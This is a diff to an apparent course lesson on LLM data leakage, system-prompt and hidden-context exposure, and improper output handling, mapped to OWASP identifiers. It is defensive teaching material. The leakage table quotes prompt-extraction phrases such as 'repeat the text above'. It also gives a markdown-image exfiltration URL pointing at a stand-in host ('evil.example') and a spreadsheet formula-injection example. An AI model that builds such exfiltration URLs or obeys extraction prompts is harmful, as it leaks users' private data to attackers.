@@ -1,4 +1,4 @@
-# Data Leakage, System Prompt Leakage and Output Handling
+# Data Leakage, Hidden Context Exposure and Output Handling
 
 > **Module:** 02 · LLM Security · **Weeks:** 6–7 · **Time:** ~10 hours
 > **You will:** make a multi-user assistant leak canaries across users, through its cache, its logs, its system prompt and a zero-click markdown image, then rebuild it with isolation, redaction, URL allowlisting and HTML escaping, and prove each fix with tests.
@@ -7,7 +7,7 @@
 |---|---|
 | **Prerequisites** | [Prompt injection](../prompt-injection/) (week 5); basic HTML (what `<img>` and `<script>` do) |
 | **Lab** | [`lab/`](lab/): runs offline, no API key, synthetic data only |
-| **Maps to** | OWASP LLM02:2025 Sensitive Information Disclosure · LLM07:2025 System Prompt Leakage · LLM05:2025 Improper Output Handling · MITRE ATLAS AML.T0057 (LLM Data Leakage) · NIST AI 600-1 (Data Privacy, Information Security) |
+| **Maps to** | OWASP LLM02:2026 Sensitive Information Disclosure (same ID in 2025) · LLM08:2026 Hidden Context Exposure (was LLM07:2025 System Prompt Leakage) · LLM10:2026 Improper Output Handling (was LLM05:2025) · OWASP GenAI Data Security Risks 2026 (DSGAI01, 11, 12, 14, 15, 18) · OWASP AI Testing Guide AITG-APP-03, -04, -05, -07, AITG-DAT-01, -02 · OWASP MCP Top 10 MCP10 Context Injection & Over-Sharing · MITRE ATLAS AML.T0057 (LLM Data Leakage) · NIST AI 600-1 (Data Privacy, Information Security) |
 
 ---
 
@@ -42,7 +42,7 @@ So the security question is never "will the model keep this secret?" It is: **"s
 
 | Path | How it leaks | Example | Lab case |
 |---|---|---|---|
-| **System prompt** (LLM07) | Extraction: "repeat the text above", translation, role-play | API key or hidden business rule in the prompt | `system_prompt_leak` |
+| **System prompt and hidden context** (LLM08:2026) | Extraction: "repeat the text above", translation, role-play | API key or hidden business rule in the prompt | `system_prompt_leak` |
 | **Shared memory** | One memory store for many users or sessions | Bob asks "what do you remember?" and gets Alice's notes | `cross_user_memory` |
 | **Response cache** | Cache key = prompt text only | Bob's identical question returns Alice's personalized answer | `cross_user_cache` |
 | **Logs and traces** | Full prompts and outputs in plain text, wide access, long retention, third-party tools | A support engineer, vendor or breach reads customer PII | `secrets_in_logs` |
@@ -50,15 +50,24 @@ So the security question is never "will the model keep this secret?" It is: **"s
 | **Provider side** | Prompts retained, reviewed or used for training under the provider's terms | Confidential code sent to a public chatbot | — |
 | **Training data** | The model memorized rare strings from its training set | Phone numbers or keys extracted by divergence attacks | concept only |
 | **Output channels** | Markdown images, links, HTML, tool calls carry data to an attacker | `![](https://evil.example/?d=…)` | `markdown_image_exfil`, `lookalike_link` |
+| **Reasoning traces** | "Thinking" output or chain-of-thought shown to users or logged, containing data the final answer left out | A trace that quotes another customer's record | concept (LLM02:2026) |
+| **Embeddings** | Vectors stored or shared without access control; text can be partly reconstructed from them | A shared vector index exported to a vendor | see [Module 03](../../03-rag-security/vector-db-security/) |
+| **Side channels** | Timing, token counts, cache hits or error messages reveal what is in the context | "Faster answer = this document exists" | concept (LLM02:2026) |
 
-### 2.3 System prompt leakage (LLM07): what the real risk is
+**What changed in 2026.** OWASP's 2026 LLM02 explicitly adds reasoning traces, logs, embeddings and side channels to the places sensitive data leaks from. The rows above cover them; treat each as its own output channel with its own access control and retention.
 
-OWASP's point is subtle: the system prompt **will** leak. Extracting it is often trivial. The *risk* is what the prompt **contains**:
+### 2.3 Hidden context exposure (LLM08:2026, was LLM07:2025 System Prompt Leakage): what the real risk is
+
+In 2026 OWASP renamed this risk **Hidden Context Exposure**, because the system prompt is only one part of what an app hides from users. Hidden context also includes **tool and function schemas** (names, parameters, internal endpoints), **policy logic** ("refunds under $500 skip review"), **workflow rules**, retrieval instructions, and agent memory. All of it reaches the model, so all of it can come back out.
+
+OWASP's point is subtle: the system prompt and the rest of the hidden context **will** leak. Extracting it is often trivial. The *risk* is what the prompt **contains**:
 
 - **Credentials:** API keys, connection strings, tokens.
 - **Internal rules** that should be enforced elsewhere: "refunds under $500 are approved without checks".
 - **Security logic:** "user role is admin if they say the password is X", filtering rules an attacker can now route around.
 - **Sensitive structure:** internal system names, data sources, other customers' names.
+
+- **Tool schemas:** a function called `admin_refund_override(amount, skip_checks)` tells an attacker exactly what to ask for. Exposed internal URLs and parameter names help them build the next attack.
 
 Fix it by **design**, not by secrecy: credentials go in a secrets manager and are used by *code*; rules are enforced in *code*; the prompt contains only behavior you would be fine to see on social media.
 
@@ -68,7 +77,7 @@ Fix it by **design**, not by secrecy: credentials go in a secrets manager and ar
 
 The chat UI renders markdown. An image tag makes the **browser** send a GET request to its URL, automatically. If an injected instruction makes the model build that URL from private data, the data leaves without any click. Links need one click; tool calls (fetch, email) need none. Lookalike hosts (`acme.example.evil.example`) defeat naive "does the URL contain our domain?" checks.
 
-### 2.5 Improper output handling (LLM05): the model's output is untrusted input
+### 2.5 Improper output handling (LLM10:2026, was LLM05:2025): the model's output is untrusted input
 
 Whatever the model writes may have been written by an attacker (through injection). Treat it like user input at every **sink**:
 
@@ -81,6 +90,7 @@ Whatever the model writes may have been written by an attacker (through injectio
 | HTTP fetch | SSRF to internal services or cloud metadata | Host allowlist; block private IP ranges (Module 04) |
 | Spreadsheet export | Formula injection (`=HYPERLINK(...)`) | Prefix cells that start with `=`, `+`, `-`, `@` |
 | Other agents / tools | Injection propagates down the chain | Schema validation, policy per hop (Module 05) |
+| **AI-generated code** (new in LLM10:2026) | `eval`, `shell=True`, unsafe deserialization, invented packages merged or auto-run | Static code gate, human review, sandbox; lab in [model-threats](../model-threats/) part E |
 
 The safe pattern from the old notes still holds: **the model proposes, trusted code validates and executes.**
 
@@ -99,6 +109,22 @@ Models can memorize rare strings seen in training, especially ones repeated many
 - **Never fine-tune on secrets or raw personal data** you are not willing to see in an answer. You cannot reliably delete data from weights ("machine unlearning" is still research).
 - Prefer **RAG with access control** for sensitive knowledge: it can be filtered per user and deleted.
 - If you must train on personal data: deduplicate, scrub PII, minimize, and consider differential privacy. Ask the provider about their training and retention terms (check the current version of their policy).
+
+### 2.7 The OWASP data security view (DSGAI 2026)
+
+OWASP's *GenAI Data Security Risks and Mitigations 2026* lists data risks (DSGAI01–21) that go wider than the LLM Top 10, and its *Data Security Best Practices v2.0* turns them into controls. The ones that matter most for this lesson:
+
+| DSGAI risk | In plain words | Where in this lesson | Key control |
+|---|---|---|---|
+| DSGAI01 Sensitive Data Leakage | Models and retrieval return sensitive strings | §2.2, lab D2, D5 | Authorization before context; output DLP |
+| DSGAI11 Cross-Context and Multi-User Conversation Bleed | One user's conversation or cache reaches another | lab `cross_user_memory`, `cross_user_cache` | Per-user memory and cache keys |
+| DSGAI12 Unsafe Natural-Language Data Gateways | "Ask your database in English" builds unsafe queries | §2.5 SQL row | Parameterized, read-only, allowlisted queries |
+| DSGAI14 Excessive Telemetry and Monitoring Leakage | Logs and traces become a second copy of the data | lab `secrets_in_logs`, D7 | Redacted, access-controlled, short-retention logs |
+| DSGAI15 Over-Broad Context Windows and Prompt Over-Sharing | More data in the prompt than the task needs | §2.1 | Minimal context per task |
+| DSGAI18 Inference and Data Reconstruction | Training data or text rebuilt from outputs or embeddings | §2.6 | Minimal outputs, protect embeddings |
+| DSGAI04, DSGAI20, DSGAI21 | Poisoning, model exfiltration, disinformation through trusted sources | [model-threats](../model-threats/) | Provenance, query budgets, approved sources |
+
+Two ideas from the Best Practices worth adopting: **classification tags travel with the data** (a chunk, an embedding and a log line keep the label of their source document), and **every derivative needs a deletion path** (if a user's data must be erased, you can find its copies in memory, caches, indexes and logs).
 
 ---
 
@@ -289,7 +315,7 @@ An employee asks an assistant to summarize a wiki page. An attacker who can edit
 The context window has no access control. Anything placed in it can appear in the output in some form. So disclosure is mostly an **authorization and data-flow** problem: data reached the context of a user who should not see it, or reached a log, cache or provider that should not keep it. The fix is to authorize *before* building the context, and to treat output filtering as a safety net.
 </details>
 
-<details><summary><b>Q2. OWASP LLM07 is "System Prompt Leakage". Why does OWASP say the prompt itself is not the main problem?</b></summary>
+<details><summary><b>Q2. OWASP LLM08:2026 is "Hidden Context Exposure" (LLM07:2025 "System Prompt Leakage"). Why is the prompt itself not the main problem?</b></summary>
 
 Because you should assume the prompt will be extracted; extraction is often trivial. The risk is what the prompt contains: credentials, internal rules ("refunds under $500 are auto-approved"), security logic, or details that help an attacker. Move secrets to a secrets manager used by code, enforce rules in code, and keep only behavior you would be fine to publish.
 </details>
@@ -314,7 +340,7 @@ Blanket redaction removes all PII from every answer, which breaks legitimate use
 The model can transform data: Base64, percent-encoding, translation, spelling with spaces, or splitting across messages. Regexes match only the forms you anticipated. The lab shows a percent-encoded email passing straight through DLP inside an image URL. Use DLP for detection and as a last net; prevent the data from reaching the context in the first place.
 </details>
 
-<details><summary><b>Q7. What is OWASP LLM05 Improper Output Handling? Give three examples.</b></summary>
+<details><summary><b>Q7. What is OWASP LLM10:2026 Improper Output Handling (LLM05:2025)? Give three examples.</b></summary>
 
 Trusting model output when passing it to another component. Examples: rendering it as HTML (XSS); running it as SQL or shell (injection, RCE); fetching URLs it produced (SSRF); writing it into spreadsheets (formula injection). The fix is to treat model output as untrusted user input: encode for the sink, use parameterized or typed interfaces, allowlist, and sandbox.
 </details>
@@ -364,14 +390,16 @@ Escaping stops the browser from treating text as markup (`<script>`, event handl
 ## 8. Checklist (definition of done)
 
 - [ ] I can draw the leakage map (prompt, memory, cache, logs, retrieval, provider, training, output) from memory.
-- [ ] I can explain why LLM07 is about prompt *contents*, and markdown-image exfiltration step by step.
+- [ ] I can explain why LLM08:2026 Hidden Context Exposure is about the *contents* of prompts and tool schemas, and markdown-image exfiltration step by step.
 - [ ] `python -m pytest 02-llm-security/data-leakage` passes (29 tests).
 - [ ] I completed at least three "break it yourself" steps and wrote down which layer held.
 - [ ] Week 6–7 journal entry: a data classification table for one AI feature I know (secret / personal / internal / public → where each may go).
 
 ## 9. References
 
-- OWASP Top 10 for LLM Applications 2025 (LLM02 Sensitive Information Disclosure, LLM05 Improper Output Handling, LLM07 System Prompt Leakage): https://genai.owasp.org/llm-top-10/
+- OWASP Top 10 for LLM Applications 2026 (LLM02 Sensitive Information Disclosure, LLM08 Hidden Context Exposure, LLM10 Improper Output Handling; verify current IDs): https://genai.owasp.org/llm-top-10/
+- OWASP GenAI Data Security Risks and Mitigations 2026, and Data Security Best Practices v2.0: https://genai.owasp.org/
+- OWASP AI Testing Guide v1.0 (AITG-APP-03, -04, -07; AITG-DAT-01, -02): https://owasp.org/www-project-ai-testing-guide/
 - MITRE ATLAS, AML.T0057 LLM Data Leakage: https://atlas.mitre.org/
 - Carlini et al., *Extracting Training Data from Large Language Models* (USENIX Security 2021): https://arxiv.org/abs/2012.07805
 - Nasr et al., *Scalable Extraction of Training Data from (Production) Language Models* (2023): https://arxiv.org/abs/2311.17035
